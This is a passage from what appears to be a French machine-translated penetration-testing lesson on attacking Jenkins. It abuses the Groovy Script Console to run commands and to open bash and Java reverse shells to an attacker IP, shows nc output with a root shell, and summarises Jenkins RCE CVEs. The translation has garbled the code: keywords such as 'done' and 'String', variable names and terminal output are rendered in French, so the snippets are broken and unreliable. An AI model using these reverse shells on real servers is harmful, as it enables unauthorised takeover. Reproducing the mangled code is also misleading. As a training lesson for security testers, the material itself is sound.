Attaquer Jenkins
=================

* * * * *

Nous avons confirmé que l'hôte exécute Jenkins et qu'il est configuré avec des informations d'identification faibles. Vérifions et voyons quel type d'accès cela nous donnera.

Une fois que nous avons obtenu l'accès à une application Jenkins, un moyen rapide d'exécuter une commande sur le serveur sous-jacent consiste à utiliser [Script Console](https://www.jenkins.io/doc/book/managing/script-console/) . La console de script nous permet d'exécuter des scripts Groovy arbitraires dans l'environnement d'exécution du contrôleur Jenkins. Cela peut être utilisé de manière abusive pour exécuter des commandes du système d'exploitation sur le serveur sous-jacent. Jenkins est souvent installé dans le contexte du compte root ou SYSTEM, donc cela peut être une victoire facile pour nous.

* * * * *

Console de scripts
--------------

La console de script est accessible à l'URL `http://jenkins.inlanefreight.local:8000/script`. Cette console permet à un utilisateur d'exécuter des scripts Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) , qui sont un langage compatible Java orienté objet. Le langage est similaire à Python et Ruby. Le code source Groovy est compilé en Java Bytecode et peut s'exécuter sur n'importe quelle plate-forme sur laquelle JRE est installé.

À l'aide de cette console de script, il est possible d'exécuter des commandes arbitraires, fonctionnant de la même manière qu'un shell Web. Par exemple, nous pouvons utiliser l'extrait de code suivant pour exécuter la commande `id` .

Code : groovy

```
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sud

```

![](https://academy.hackthebox.com/storage/modules/113/groovy_web.png)

L'accès à la console de script peut être exploité de différentes manières pour obtenir un shell inversé. Par exemple, en utilisant la commande ci-dessous ou [this](https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console) module Metasploit.

Code : groovy

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; fait"] en tant que chaîne[])
p.waitFor()

```

L'exécution des commandes ci-dessus entraîne une connexion shell inversée.

```
dsgsec@htb[/htb]$ nc -lvnp 8443

écoute sur [tout] 8443 ...
se connecter à [10.10.14.15] depuis (INCONNU) [10.129.201.58] 57844

identifiant

uid=0(racine) gid=0(racine) groupes=0(racine)

/bin/bash-i

root@app02 :/var/lib/jenkins3#

```

Contre un hôte Windows, nous pourrions essayer d'ajouter un utilisateur et de se connecter à l'hôte via RDP ou WinRM ou, pour éviter de modifier le système, utiliser une station de téléchargement PowerShell avec [Invoke-PowerShellTcp.ps1](https:// github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Nous pourrions exécuter des commandes sur une installation Jenkins basée sur Windows en utilisant cet extrait :

Code : groovy

```
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");

```

Nous pourrions également utiliser [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell pour obtenir l'exécution de commandes sur un hôte Windows, en remplaçant `localhost` et le port pour notre adresse IP et notre port d'écoute.

Code : groovy

```
Chaîne host="localhost" ;
port int=8044 ;
Chaîne cmd="cmd.exe" ;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s. getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read() );while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush(); po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

* * * * *

Vulnérabilités diverses
-----------------------------

Plusieurs vulnérabilités d'exécution de code à distance existent dans différentes versions de Jenkins. Un exploit récent combine deux vulnérabilités, CVE-2018-1999002 et [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) pour obtenir une connexion à distance pré-authentifiée. l'exécution du code, en contournant la protection du bac à sable de sécurité des scripts lors de la compilation des scripts. Des PoC d'exploit publics existent pour exploiter une faille dans le routage dynamique Jenkins afin de contourner l'ACL globale/de lecture et d'utiliser Groovy pour télécharger et exécuter un fichier JAR malveillant. Cette faille permet aux utilisateurs disposant d'autorisations de lecture de contourner les protections du bac à sable et d'exécuter du code sur le serveur maître Jenkins. Cet exploit fonctionne avec la version 2.137 de Jenkins.

Une autre vulnérabilité existe dans Jenkins 2.150.2, qui permet aux utilisateurs disposant des privilèges de création de JOB et de BUILD d'exécuter du code sur le système via Node.js. Cette vulnérabilité nécessite une authentification, mais si les utilisateurs anonymes sont activés, l'exploit réussira car ces utilisateurs disposent par défaut des privilèges de création de JOB et de BUILD.

Comme nous l'avons vu, l'accès à Jenkins en tant qu'administrateur peut rapidement conduire à l'exécution de code à distance. Bien que plusieurs exploits RCE fonctionnels existent pour Jenkins, ils sont spécifiques à la version. Au moment de la rédaction de cet article, la version LTS actuelle de Jenkins est la 2.303.1, quih corrige les deux défauts détaillés ci-dessus. Comme pour toute application ou système, il est important de renforcer Jenkins autant que possible, car les fonctionnalités intégrées peuvent être facilement utilisées pour prendre en charge le serveur sous-jacent.

* * * * *

Changement de vitesse
--------------

Nous avons couvert diverses manières dont les applications populaires de développement de CMS et de conteneurs de servlets/logiciels peuvent être abusées pour exploiter à la fois des vulnérabilités connues et des fonctionnalités intégrées. Concentrons-nous un peu sur deux outils de surveillance d'infrastructure/réseau bien connus : Splunk et PRTG Network Monitor.